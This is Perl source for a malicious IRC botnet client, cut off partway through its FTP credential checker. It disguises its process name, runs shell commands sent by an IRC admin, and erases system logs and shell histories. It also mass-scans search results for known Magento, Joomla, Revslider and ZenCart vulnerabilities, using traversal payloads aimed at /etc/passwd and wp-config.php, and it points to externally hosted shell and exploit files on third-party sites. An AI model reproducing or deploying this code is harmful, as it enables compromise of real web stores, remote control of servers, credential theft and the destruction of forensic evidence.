#!/usr/bin/perl

use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Request::Common qw(POST);
use LWP::Simple;
use LWP 5.64;
use LWP::UserAgent;
use Socket;
use IO::Socket;
use IO::Socket::INET;
use IO::Select;
use MIME::Base64;
use URI::Escape;
use Digest::MD5 qw(md5_hex);
use DBI;
#use DBD::mysql;

my $datetime    = localtime;
my $number      = int(rand(100));
my $fakeproc  	= "/usr/sbin/fakeproc";
my $ircserver   = "irc.planetwork.co.id";
my $ircport     = "6667";
my $nickname  	= "Lulzec";
my $ident     	= "BotScannerKolamTuyul";
my $channel   	= "#autorun";
my $chanxxx	    = "#bank";
my $admin    	= "Hydra7";
my $fullname    = "-";
my $rawmsg      = $ARGV[4];
my $msgraw      = $ARGV[5];

my $nob0dy	    = "9,1[4!9]15[SC4NN3R] By $channel ";
my $magelogo    = "9,1[4!9]15Magento 4<9=4> ";
my $revlogo 	= "9,1[4!9]15Revsliders 4<9=4> ";
my $jcelogo 	= "9,1[4!9]15JcE 4<9=4> ";
my $zenlogo  	= "9,1[4!9]15ZenCart 4<9=4> ";
my $joomlalogo	= "9,1[4!9]15Joomla 4<9=4> ";
my $oscologo	= "9,1[4!9]15OSCO 4<9=4> ";
my $loglogo     = "9,1[4!9]15LogScan 4<9=4> ";
my $carilogo    = "9,1[4!9]15Find 4<9=4> ";
my $shopliftcmd = "!shoplift2";
my $magadmincmd	= "!admin2";
my $magsqlcmd	= "!magsql2";
my $maglficmd   = "!maglfi2";
my $mageuplcmd  = "!magmi2";
my $jcecmd 		= "!jce2";
my $revcmd 		= "!rev2";
my $zencmd 		= "!zen2";
my $joomlacmd 	= "!joomla2";
my $ftpcmd	= "!ftp2";
my $botsaver	= "http://4dlaser.ru//tmp/udp.php";
my $hostxpl 	= "http://4dlaser.ru//tmp/";
my $shopliftxpl = "".$hostxpl."shoplift.php";
my $ftpxpl 		= "".$hostxpl."ftp.php";
my $revxpl 		= "".$hostxpl."rev.php";
my $lfishell	= "http://4dlaser.ru//tmp/lfishell.txt";
my $mag_shell	= "rss.zip";
my $timot	    = 10;
my $silentmode	= 1;
my $uagent      = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";
my $lfdtest     = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";
my $jpath	    = "http://onebuy.in/var/tmp/search.php?____pgfa=http%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jackae      = "http://www.allhair-wigs.co.uk/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.character.com/shell/pass/search.php
my $jackar      = "http://www.software-smart-solutions.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://catalangourmet.com/tmp/pass/search.php
my $jackat      = "http://www.esteticaaquarelle.es/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://gappimp.at/wp-content/uploads/2011/05/script-loader.php
my $jackau      = "http://www.xstitchdesign.co.nz/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://cascelloid.com/var/tmp/search.php
my $jackbr      = "http://www.maxidetall.com/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.tiendatropicalia.com/shell/pass/search.php
my $jackca      = "http://www.hardwaredepot.nl/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.freedomhealthcare.co.uk/var/pass/search.php
my $jackcl      = "http://www.carnivalbkk.com/var/cache/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://urahresources.com/tmp/pass/search.php
my $jackcn      = "http://w3.bikehome.com.tw/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jackcom     = "http://www.desertpublications.net/var/pass/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jackcz      = "http://www.lcherrup.dk/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.freytagberndt.cz/media/pass/script-loader.php
my $jackde      = "http://www.mrfloorball.de/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.perfumemania.es/shell/pass/search.php
my $jackdk      = "http://rhodo-roskilde.dk/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://djohansenhusdyrutstyr.no/shell/pass/search.php
my $jackes      = "http://shop.ourtree.es/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.mdsbooks.co.uk/shell/pass/search.php
my $jackeu      = "http://www.boston-medical-supply.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.shatleyfarms.com/shell/pass/search.php
my $jackfr      = "http://www.socadis-cadeaux.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://shop.alpine-peters.de//var/pass/script-loader.php
my $jackhu      = "http://www.logitechshop.com.au/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#ttp://www.eyeforce.com.tr/var/pass/search.php
my $jackid      = "http://wish-fashion.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.voga.com/var/pass/search.php
my $jackil      = "http://www.kawaiishop.fr/var/pass/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.ahsapoyuncak.web.tr/shell/pass/search.php
my $jackin      = "http://faydadeals.com/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://safetysupplycity.com/shell/pass/script-loader.php
my $jackinfo    = "http://www.josemegre.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.kronosav.com/var/pass/search.php
my $jackir      = "http://selestastore.com/var/cache/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://store.british-bodybuilding.co.uk/var/pass/script-loader.php
my $jackit      = "http://rhodo-roskilde.dk/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.eyaas.com/var/pass/search.php
my $jackjp      = "http://tranqueron.com.ar/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.phatgrrl.com/var/pass/search.php
my $jackkr      = "http://micco.com.co/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.vintagexl.com/media/pass/search.php
my $jackmx      = "http://www.cantabilshop.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://hierba.es/var/pass/search.php
my $jackmy      = "http://www.pabucino.com/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.thrift-king.com/var/pass/search.php
my $jacknet     = "http://daab-shop.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.gutenparts.com/var/pass/search.php
my $jacknl 		= "http://eliram.co.il/js/3v1L/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jackorg     = "http://spa-experts.ie/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://leatheronedirect.com/sitemap/pass/script-loader.php
my $jackph      = "http://www.justfashion.fr/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.mintenglobalsecurity.com/shell/pass/search.php
my $jackpl      = "http://thememstore.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.move-lift-n-store.com.au/var/pass/search.php
my $jackro      = "http://www.magtel.ro/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jackru      = "http://shop.praesenta.de/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://rosen-union.de/var/pass/script-loader.php
my $jackth      = "http://www.itsolution.co.th/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.e2.jo/var/pass/script-loader.php
my $jackua      = "http://www.enchantingminis.com.au/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://e-cigarette.eu/var/pass/script-loader.php
my $jackuk      = "http://www.turtonwines.co.uk/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://savvyschools.ie/wp-includes/images/pass/script-loader.php
my $jackus      = "http://www.cheapcarbonbike.com/var/tmp/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://mkii.ru/var/pass/script-loader.php
my $jacksi      = "http://onebuy.in/var/tmp/search.php?____pgfa=http%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.nordicgastro.se/var/05/search.php
my $jackbe      = "http://www.arundos.info/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.kawaiishop.fr/var/pass/search.php
my $jackbiz     = "http://shop.vth.de/js/lib/search.php?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";#http://www.file-extensions.info/pass/script-loader.php
my $engine	    = "JacKAE,JacKAR,JacKAT,JacKAU,JacKBR,JacKCA,JacKCL,JacKCN,JacKCoM,JacKCZ,JacKDE,JacKDK,JacKES,JacKEU,JacKFR,JacKHU,JacKID,JacKIL,JacKIN,JacKInfO,JacKIR,JacKIT,JacKJP,JacKKR,JacKMX,JacKMY,JacKNeT,JacKNL,JacKOrG,JacKPH,JacKPL,JacKRO,JacKRU,JacKTH,JacKUA,JacKUK,JacKUS,JacKSI,JacKBE,JacKBIZ,GooGLe,GooGLeCA,GooGLeDE,GooGLeUK,GooGLeFR,GooGLeES,GooGLeIT,GooGLeNL,GooGLeBE,GooGLeCH,GooGLeSE,GooGLeDK,GooGLeNO,GooGLeNZ,GooGLeIE,GooGLeBR,GooGLeAR,GooGLeCO,GooGLeCU,GooGLeCL,GooGLeMX,GooGLeAU,GooGLeRU,GooGLeAT,GooGLePL,GooGLeIL,GooGLeTR,GooGLeUA,GooGLeGR,GooGLeJP,GooGLeCN,GooGLeMY,GooGLeTH,GooGLeIN,GooGLeKR,GooGLeRO,GooGLeTW,GooGLeZA,GooGLePT,WaLLa,YaHoo,YahOoCA,YahOoUK,YahOoDE,YahOoFR,YahOoES,YahOoIT,YahOoHK,YahOoID,YahOoIN,YahOoAU,YahOoMX,YahOoTW,YahOoBR,YahOoAR,YahOoNL,YahOoDK,YahOoPH,YahOoCL,YahOoRU,YahOoCH,YahOoCO,YahOoFI,YahOoRO,YahOoVE,YahOoAT,YahOoPL,YahOoKR,YahOoNZ,YahOoGR,YahOoPE,AsK,AsKCA,AsKDE,AsKIT,AsKUK,AsKFR,AsKES,AsKRU,AsKNL,AsKEU,AsKPL,AsKAT,AsKSE,AsKDK,AsKNO,AsKAU,AsKBR,AsKMX,AsKJP,Bing,BingDE,BingUK,BingCA,BingBR,BingFR,BingES,BingIT,BingBE,BingNL,BingPT,BingNO,BingDK,BingSE,BingCH,BingNZ,BingRU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,UoL,OnEt,CLusTy,SaPo,AoL,LyCos,HotBot,SeZNam,BigLobe";
my @jpaths	    = ('/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart',
				'/administrator/components/com_acymailing/inc/openflash',
				'/administrator/components/com_jnewsletter/includes/openflashchart',
				'/administrator/components/com_jinc/classes/graphics',
				'/administrator/components/com_maianmedia/utilities/charts',
				'/administrator/components/com_jnews/includes/openflashchart');
my $jvuln	= "/php-ofc-library/ofc_upload_image.php";
my $jshell	= "/tmp-upload-images/lobex21.php";
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
#chdir("/");
$ircserver = "$ARGV[0]" if $ARGV[0];
$ircport = "$ARGV[1]" if $ARGV[1];
$nickname = "$ARGV[2]" if $ARGV[2];
$channel = '#'."$ARGV[3]" if $ARGV[3];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep(1);}}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick($mynick.int(rand(5)));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +ix");
        sendraw("NS id planetwork23");
        sleep(3);
        sendraw("JOIN $channel 0day");
        sendraw("JOIN $chanxxx 0day");
        sleep(1);
        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
    }
}

my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);

            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;
        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);			
            if ($path eq $mynick) {
				if ($msg =~ /^PING (.*)/) {
					sendraw("NOTICE $nick :PING $1");
				}
				if ($msg =~ /^VERSION/) {
					sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
				}
				if ($msg =~ /^TIME/) {
					sendraw("NOTICE $nick :TIME ".$datetime."");
				}
				if (&isAdmin($nick) && $msg eq "!die") {
					&shell("$path","kill -9 $$");
				}
				if (&isAdmin($nick) && $msg eq "!cox") {
					&shell("$path","killall -9 perl");
				}
				if (&isAdmin($nick) && $msg eq "!reset") {
					sendraw("QUIT :Restarting...");
				}
				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
					sendraw("JOIN #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
					sendraw("PART #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
					sendraw("NICK ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!pid/) {
					sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
				}
				if (&isAdmin($nick) && $msg !~ /^!/) {
					&shell("$nick","$msg");
				}
				if (&isAdmin($nick) && $msg =~ /^!raw (.+)/) {
					sendraw("$rawmsg $msgraw ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!say (.+)/) {
					sendraw("PRIVMSG $rawmsg ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!act (.+)/) {
					sendraw("PRIVMSG $rawmsg :ACTION ".$1."");
				}
				if (&isAdmin($nick) && $msg =~ /^!timot\s+(.*) -d/) {
					$newtimot = $1;
					$timot = $newtimot;
					&msg("$admin","9,1 Get Content TimeOut change to4 $timot ");
				}
				if (&isAdmin($nick) && $msg =~ /^!chxchan\s+(.+) -d/) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$newchan = $1;
					$chanxxx = $newchan;
					&msg("$admin","9,1 xChan change to4 $chanxxx ");
				}}}
			}
			else {
				if (&isAdmin($nick) && $msg eq "!die") {
					&shell("$path","kill -9 $$");
				}
				if (&isAdmin($nick) && $msg eq "!cox") {
					&shell("$path","killall -9 perl");
				}
				if (&isAdmin($nick) && $msg eq "!reset") {
					sendraw("QUIT :Restarting...");
				}
				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
					sendraw("JOIN #".$1);
				}
				if (&isAdmin($nick) && $msg eq "!part") {
					sendraw("PART $path");
				}
				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
					sendraw("PART #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
					&shell("$path","$1");
				}
				if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
					&shell("$path","$1");
				}
				if (&isAdmin($nick) && $msg =~ /^!silent\s+(.*) -d/) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$smod = $1;
				if ($smod =~ /ON/) { $silentmode = 1; $silentstat = "ON"; }
				elsif ($smod =~ /OFF/) { $silentmode = 0; $silentstat = "OFF"; }
					&msg("$path","9,1[0!9]Silent Mode11 $silentstat !!!!");
				}}}
				if ($msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$path);
				}
				if ($msg=~ /^$cmdxml\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmdxml($url,$cmd,$path);
				}
				if ($msg=~ /^$cmde107\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmde107($url,$cmd,$path);
				}
                ##################################################################### HELP COMMAND
                if ($msg=~ /^!help/) {
					&msg("$path","4$helplogo 4 -------|| Simple IRC Bot - $channel ||------- ");
					my $helplogo = "9,1[4!9]15Help 4<9=4> ";
					&msg("$path","$helplogo9JoomlaCE Vuln Scan:15 $jcecmd [dork] ");
					&msg("$path","$helplogo9JoomlaLFD Vuln Scan:15 $joomlacmd [dork] ");
					&msg("$path","$helplogo9Magento ShopLift Vuln Scan:15 $shopliftcmd [dork] ");
					#&msg("$path","$helplogo9Magento ShopLift Vuln Scan 2:15 $magadmincmd [dork] ");
					&msg("$path","$helplogo9Magento Magmi Vuln Scan:15 $mageuplcmd [dork] ");
					&msg("$path","$helplogo9Magento LFI Vuln Scan:15 $maglficmd [dork] ");
					&msg("$path","$helplogo9Magento SQL Vuln Scan:15 $magsqlcmd [dork] ");
					&msg("$path","$helplogo9OsCommerce Vuln Scan:15 $oscocmd [dork] ");
					&msg("$path","$helplogo9Revslider Vuln Scan:15 $revcmd [dork] ");
					&msg("$path","$helplogo9ZenCart Vuln Scan:15 $zencmd [dork] ");
					&msg("$path","$helplogo9Tools:15 !ip [ip] | !port [ip] [port] | !dns [hostname] | !ftp [host] [user] [pass] ");
					&msg("$path","4$helplogo4Exploiting Our World With Our Evil Code!");
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &msg("$nick","6Fake Process/PID : $fakeproc - $$");
                }
				if (&isAdmin($nick) && $msg =~ /^!op/) {
					sendraw("MODE ".$channel." +op ".$admin."");
				}
				##################################################################### DELETE LOG
				if (&isAdmin($nick) && $msg =~ /^!eraselog/) {
                    &msg("$path","$loglogo9,1 Permintaan sedang di proses...");
					&msg("$path","$loglogo4 Mohon di tunggu...!");
                    system 'rm -rf /var/log/lastlog';
                    system 'rm -rf /var/log/wtmp';
	                system 'rm -rf /etc/wtmp';
	                system 'rm -rf /var/run/utmp';
	                system 'rm -rf /etc/utmp';
	                system 'rm -rf /var/log';
	                system 'rm -rf /var/logs';
	                system 'rm -rf /var/adm';
	                system 'rm -rf /var/apache/log';
	                system 'rm -rf /var/apache/logs';
	                system 'rm -rf /usr/local/apache/log';
	                system 'rm -rf /usr/local/apache/logs';
	                system 'rm -rf /root/.bash_history';
	                system 'rm -rf /root/.ksh_history';
                    &msg("$path","$loglogo13 Semua 4default log13 dan berkas 4bash_history 13terhapus.");
		            sleep 1;
                    &msg("$path","$loglogo13 Sekarang sisa berkas mesin4 LOG.");
	                system 'find / -name *.bash_history -exec rm -rf {} \;';
	                system 'find / -name *.bash_logout -exec rm -rf {} \;';
	                system 'find / -name "log*" -exec rm -rf {} \;';
	                system 'find / -name *.log -exec rm -rf {} \;';
		            sleep 1;
                    &msg("$path","$loglogo9,1 Selesai! Semua log dalam server sudah di hapus...!!!");
                }
                ##################################################################### SCAN
                if ($msg =~ /^$shopliftcmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("/customer/account/login",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Magento ShopLift di 4$path ");
								&msg("$path","$magelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$magelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,1);
						}
					}
				}
                if (&isAdmin($nick) && $msg =~ /^$magadmincmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("/customer/account/login",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Magento ShopLift Gate 2 di 4$path ");
								&msg("$path","$magelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$magelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,2);
						}
					}
				}
				if ($msg =~ /^$magsqlcmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("index.php/api/xmlrpc",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Magento SQL di 4$path ");
								&msg("$path","$magelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$magelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,3);
						}
					}
				}
				if ($msg =~ /^$mageuplcmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("magmi/web/magmi.php",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Magento Magmi di 4$path ");
								&msg("$path","$magelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$magelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,4);
						}
					}
				}
				if ($msg =~ /^$jcecmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan JoomlaCE di 4$path ");
								&msg("$path","$jcelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$jcelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,6);
						}
					}
				}
				if ($msg =~ /^$revcmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Revslider di 4$path ");
								&msg("$path","$revlogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$revlogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,7);
						}
					}
				}
				if ($msg =~ /^$revcmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",$1);
						&se_start($path,$bug,$dork,$engine,8);
						}
					}
				}
				if ($msg =~ /^$zencmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("admin/sqlpatch.php/password_forgotten.php?action=execute",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan ZenCart di 4$path ");
								&msg("$path","$zenlogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$zenlogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,9);
						}
					}
				}
				if ($msg =~ /^$joomlacmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my ($bug,$dork) = ("/index.php?option=com_cckjseblod&task=download&file=configuration.php",$1);
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Joomla LFD di 4$path ");
								&msg("$path","$joomlalogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$joomlalogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$dork,$engine,10);
						}
					}
				}
				if ($msg =~ /^$maglficmd\s+(.*)/) {
                	if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
								my ($bug,$dork) = ("magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility",$1);
								my $simpan = $nick;
								&msg("$chanxxx","9,1[4!9]15Lapor 4<9=4> 9$nick 15lagi scan Magento LFI di 4$path ");
								&msg("$path","$magelogo9Dork 4<9=4>15 $dork ");
								&msg("$path","$magelogo9Search Engine 4<9=4>15 Wait Loading.....! ");
								&se_start($path,$bug,$simpan,$dork,$engine,11);
						}
					}
				}
				if ($msg=~ /^!ip\s+(.*)/ ) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
						my $ip = $1;
							&msg("$path","9,1[4!9]15IP 4<9=4>15Searching ".$ip." 4Location ...");
						my $website = "http://www.ipligence.com/geolocation";
						my ($useragent,$request,$response,%form);
						undef %form;
						$form{ip} = $ip;
						$useragent = LWP::UserAgent->new;
						$useragent->timeout(5);
						$request = POST $website,\%form;
						$response = $useragent->request($request);
						if ($response->is_success) {
						my $res = $response->content;
							if ($res =~ m/Your IP address is(.*)<br>City:(.*)<br\/>Country:(.*)<br>Continent:(.*)<br>Time/g) {
							my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
							&msg("$path","9,1[4!9]15IP 4<9=4>15IP Address : ".$ip." 4[".$ipaddress."]");
							&msg("$path","9,1[4!9]15IP 4<9=4>15City : ".$ip." 4[".$city."]");
							&msg("$path","9,1[4!9]15IP 4<9=4>15Country : ".$ip." 4[".$country."]");
							&msg("$path","9,1[4!9]15IP 4<9=4>15Continent : ".$ip." 4[".$continent."]");
							}
							else {
								&msg("$path","9,1[4!9]15IP 4<9=4>15 ".$ip." 4not found in database");
							}
						}
						else {
							&msg("$path","9,1[4!9]15IP 4<12=4> 4 Cannot open IP database.");
						}
					}
					exit;
					}
				}
				if ($msg=~ /^!dns\s+(.*)/){
					my $nsku = $1;
					my $mydns = inet_ntoa(inet_aton($nsku));
					&msg("$path", "9,1[4!9]15DNS 4<9=4>15$nsku 4Resolved to 4 $mydns");
				}
				if ($msg=~ /^!port\s+(.*?)\s+(.*)/ ) {
					my $hostip= "$1";
					my $portsc= "$2";
					my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
					if ($scansock) {
						&msg("$path","9,1[4!9]15PORT 4<9=4>15 $hostip : $portsc 12Successful !");
					}
					else {
						&msg("$path","9,1[4!9]15PORT 4<9=4>15 $hostip : $portsc 4Failed !");
					}
				}
				if ($msg =~ /^$ftpcmd\s+(.+?)\s+(.*)\s+(.*)/) {
				my $url = $_[0];
				my $host = $_[1];
				my $user = $_[2];
				my $pass = $_[3];
					if (my $pid = fork) {
						waitpid($pid, 0);
					} else {
						if (fork) { exit; } else {
				my ($host,$user,$pass) = ($1,$2,$3);
					&msg("$path","9,1[4!9]FTP 4<9=4>15 Checking $host | $user:$pass");
					my $success = 1;
					use Net::FTP;
					my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);
					$success = 0 if $ftp->login($user,$pass);
					$ftp->quit;
